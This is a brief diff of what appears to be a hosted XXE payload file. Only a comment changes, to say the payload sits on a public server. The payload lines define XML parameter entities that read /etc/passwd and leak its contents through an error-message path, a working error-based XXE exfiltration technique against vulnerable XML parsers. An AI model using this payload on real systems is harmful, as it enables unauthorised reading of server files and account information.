@@ -5,7 +5,7 @@
 
 
 
-//hosted payload for multi line file 
+//hosted payload on public server for multi line file 
 
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % stack "<!ENTITY &#x25; exfile SYSTEM 'file:///error/%file;'>">
